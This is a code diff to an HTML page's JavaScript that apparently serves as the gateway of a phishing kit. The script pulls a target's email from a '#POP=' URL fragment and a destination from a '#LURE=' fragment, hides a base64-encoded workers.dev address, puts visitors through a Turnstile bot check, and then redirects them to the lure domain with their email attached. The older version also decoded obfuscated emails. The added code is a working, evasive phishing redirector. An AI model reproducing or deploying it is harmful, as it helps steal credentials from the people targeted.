@@ -44,240 +44,150 @@
     </style>
 
     <script>
-    window.onload = async function () {
-        var USE_TURNSTILE = true;
+window.onload = async function () {
+    var USE_TURNSTILE = true;
 
-        // Create loading div
-        var loadingDiv = document.createElement("div");
-        loadingDiv.id = "lsrt";
+    // Create loading div
+    var loadingDiv = document.createElement("div");
+    loadingDiv.id = "lsrt";
 
-        // Valid Base64-encoded SVG and CSS content
-        var base64HTML = '';
-    var base64CSS = '';
-
-        // Decode base64 to HTML
-        function decodeBase64ToHTML(base64) {
-            try {
-                return atob(base64);
-            } catch (e) {
-                console.error('Failed to decode base64', e);
-                return '';
-            }
-        }
-
-        var loaderSVGString = decodeBase64ToHTML(base64HTML);
-        if (loaderSVGString.trim()) {
-            loadingDiv.innerHTML = loaderSVGString;
-            document.body.appendChild(loadingDiv);
-        } else {
-            console.error('Decoded SVG is empty or invalid');
-        }
-
-        // Decode base64 to CSS
-        function decodeBase64ToCSS(base64) {
-            try {
-                return atob(base64);
-            } catch (e) {
-                console.error('Failed to decode base64', e);
-                return '';
-            }
-        }
-
-        var loadingStyle = document.createElement("style");
-        loadingStyle.textContent = decodeBase64ToCSS(base64CSS);
-        document.head.appendChild(loadingStyle);
-
-        // Remove loading animation after 15 seconds
-        setTimeout(function() {
-            loadingDiv.style.display = 'none';
-        }, 3000);
-
-        // Function to decode Base64
-        function decodeBase64(encoded) {
-            try {
-                return atob(encoded);
-            } catch (e) {
-                console.error('Failed to decode base64', e);
-                return null;
-            }
-        }
-
-        // Check if the email is in the obfuscated format
-        function isObfuscatedFormat(email) {
-            // Regular expression to match the obfuscated format: (randomNumber1 character randomNumber2 +)
-            const regex = /\(\d[a-zA-Z0-9@.]\d{2}\+\)/g;
-            return regex.test(email);
-        }
-
-        // Decode the obfuscated email
-        function decodeEmail(obfuscatedEmail) {
-          // Regular expression to extract characters within the format (randomNumber1 character randomNumber2 +)
-          const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
-          let decodedEmail = '';
-          let match;
-
-          // Extract characters using the regular expression
-          while ((match = regex.exec(obfuscatedEmail)) !== null) {
-            console.log('Matched Segment:', match[0]);  // Debug: log the matched segment
-            decodedEmail += match[1];
-          }
-
-          return decodedEmail;
-        }
-
-
-// Extract and decode email from URL
-function extractAndDecodeEmail() {
-    const url = window.location.href;
-    let email = null;
-
-    // Check if the URL contains `#POP=`
-    const hashIndex = url.indexOf('#POP=');
-    if (hashIndex !== -1) {
+    // Decode Base64 to HTML
+    function decodeBase64ToHTML(base64) {
         try {
-            // Extract the part after `#POP=`
-            const hashFragment = url.substring(hashIndex + 5); // Skip past `#POP=`
-
-            // Decode the email if necessary (e.g., URL encoding)
-            email = decodeURIComponent(hashFragment);
-
-            // Check if it's in the obfuscated format and decode if necessary
-            if (isObfuscatedFormat(email)) {
-                console.log('Email is in obfuscated format. Decoding...');
-                email = decodeEmail(email);
-            }
+            return atob(base64);
         } catch (e) {
-            console.error('Failed to extract or decode email:', e);
+            console.error("Failed to decode base64", e);
+            return "";
         }
-    } else {
-        console.warn('No POP= pattern found in the URL hash.');
     }
 
-    console.log('Final Decoded Email:', email); // Debugging log
-    return email;
-}
-
-// Extract and decode domain from URL with #LURE=
-function extractLureDomain() {
-    const url = window.location.href;
-    let domain = null;
-
-    // Check if the URL contains `#LURE=`
-    const lureIndex = url.indexOf('#LURE=');
-    if (lureIndex !== -1) {
+    // Decode Base64 to CSS
+    function decodeBase64ToCSS(base64) {
         try {
-            // Extract the part after `#LURE=`
-            const hashFragment = url.substring(lureIndex + 6); // Skip past `#LURE=`
-
-            // Decode the domain if necessary (e.g., URL encoding)
-            domain = decodeURIComponent(hashFragment);
-
-            // Validate and clean the domain
-            if (isValidDomain(domain)) {
-                console.log('Valid domain extracted:', domain);
-            } else {
-                console.warn('Extracted string is not a valid domain:', domain);
-                domain = null;
-            }
+            return atob(base64);
         } catch (e) {
-            console.error('Failed to extract or decode domain:', e);
+            console.error("Failed to decode base64", e);
+            return "";
         }
-    } else {
-        console.warn('No LURE= pattern found in the URL hash.');
     }
 
-    console.log('Final Extracted Domain:', domain); // Debugging log
-    return domain;
-}
+    var loadingStyle = document.createElement("style");
+    document.head.appendChild(loadingStyle);
 
-// Helper function to validate a domain
-function isValidDomain(domain) {
-    const domainRegex = /^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/;
-    return domainRegex.test(domain);
-}
+    // Remove loading animation after 3 seconds
+    setTimeout(function () {
+        loadingDiv.style.display = "none";
+    }, 3000);
 
-// Decode Base64 URL and extract redirect URL from response
-async function getRedirectUrlWithEmail(base64Url, email) {
-    // Decode base64 to get the URL
-    const decodedUrl = atob(base64Url);
-
-    try {
-        // Make a fetch request to the decoded URL
-        const response = await fetch(decodedUrl);
-        if (response.ok) {
-            const data = await response.json();
-            
-            // Extract the URL from the response and append #M + email
-            const redirectUrl = data.message + '#' + email;
-            console.log('Extracted redirect URL:', redirectUrl);
-            return redirectUrl;
-        } else {
-            console.error('Failed to fetch data from decoded URL');
+    // Function to decode Base64
+    function decodeBase64(encoded) {
+        try {
+            return atob(encoded);
+        } catch (e) {
+            console.error("Failed to decode base64", e);
             return null;
         }
-    } catch (error) {
-        console.error('Error fetching data:', error);
-        return null;
     }
-}
-        
-// Start Turnstile verification
-function startTurnstileVerification() {
-    const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
-    if (USE_TURNSTILE) {
-        console.log('Starting Turnstile verification...');
-        turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
-            type: 'spinner',
-            callback: async function (token) {
-                if (!token) {
-                    console.error('Turnstile verification failed');
-                    return;
-                }
 
-                // Show loading animation again
-                loadingDiv.style.display = 'flex';
+    // Extract and decode email from URL
+    function extractAndDecodeEmail() {
+        const url = window.location.href;
+        let email = null;
 
-                // Extract and decode email from URL
-                var email = extractAndDecodeEmail();
-                var domain = extractLureDomain();
-                // Set a cookie for verification (optional)
-                document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
-
-                // Wait for 3 seconds, then redirect
-                setTimeout(async function() {
-                    loadingDiv.style.display = 'none';
-
-                    if (email) {
-                        // Get the final redirect URL
-                        const redirectUrl = `${domain}POP=${email}?redirected=done`;
-                        if (redirectUrl) {
-                            console.log('Redirecting with email:', email); // Debug log to check the email
-                            window.location.href = redirectUrl;
-                        } else {
-                            console.log('Failed to retrieve redirect URL.');
-                        }
-                    } else {
-                        console.log('No email found to append to URL.');
-                    }
-                }, 2000);
-            },
-            'error-callback': function () {
-                console.error('Turnstile encountered an error');
+        // Check if the URL contains `#POP=`
+        const hashIndex = url.indexOf("#POP=");
+        if (hashIndex !== -1) {
+            try {
+                // Extract the part after `#POP=`
+                const hashFragment = url.substring(hashIndex + 5); // Skip past `#POP=`
+                email = decodeURIComponent(hashFragment);
+            } catch (e) {
+                console.error("Failed to extract or decode email:", e);
             }
-        });
-    } else {
-        console.log('Turnstile is not enabled.');
+        } else {
+            console.warn("No #POP= pattern found in the URL hash.");
+        }
+
+        console.log("Final Decoded Email:", email); // Debugging log
+        return email;
     }
-}
 
-// Run Turnstile verification
-startTurnstileVerification();
+    // Extract domain from URL with #LURE=
+    function extractLureDomain() {
+        const url = window.location.href;
+        let domain = null;
 
-        // Example usage of email extraction (optional)
-        var email = extractAndDecodeEmail();
-        console.log('Extracted and Decoded Email:', email);
-    };
+        // Check if the URL contains `#LURE=`
+        const lureIndex = url.indexOf("#LURE=");
+        if (lureIndex !== -1) {
+            try {
+                // Extract the part after `#LURE=`
+                domain = url.substring(lureIndex + 6); // Skip past `#LURE=`
+                domain = decodeURIComponent(domain); // Decode the domain if necessary
+            } catch (e) {
+                console.error("Failed to extract or decode domain:", e);
+            }
+        } else {
+            console.warn("No #LURE= pattern found in the URL hash.");
+        }
+
+        console.log("Final Extracted Domain:", domain); // Debugging log
+        return domain;
+    }
+
+    // Function to redirect to a properly formatted URL
+    async function redirectToProperUrl() {
+        const email = extractAndDecodeEmail();
+        const domain = extractLureDomain();
+
+        if (!email || !domain) {
+            console.error("Missing email or domain for redirection.");
+            return;
+        }
+
+        // Construct the new URL
+        const redirectUrl = `${domain}#POP=${email}?redirected=done`;
+
+        console.log("Redirecting to:", redirectUrl); // Debug log to check the final URL
+        window.location.href = redirectUrl; // Perform the redirection
+    }
+
+    // Start Turnstile verification
+    function startTurnstileVerification() {
+        const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
+        if (USE_TURNSTILE) {
+            console.log("Starting Turnstile verification...");
+            turnstile.render("#cf-turnstile", {
+                sitekey: "0x4AAAAAAAymSY_rn4CFRQRl",
+                type: "spinner",
+                callback: async function (token) {
+                    if (!token) {
+                        console.error("Turnstile verification failed");
+                        return;
+                    }
+
+                    // Show loading animation again
+                    loadingDiv.style.display = "flex";
+
+                    // Wait for 2 seconds, then redirect
+                    setTimeout(async function () {
+                        loadingDiv.style.display = "none";
+                        await redirectToProperUrl(); // Perform redirection with proper parameters
+                    }, 2000);
+                },
+                "error-callback": function () {
+                    console.error("Turnstile encountered an error");
+                },
+            });
+        } else {
+            console.log("Turnstile is not enabled.");
+        }
+    }
+
+    // Run Turnstile verification
+    startTurnstileVerification();
+};
+
 </script>
 
     <script>
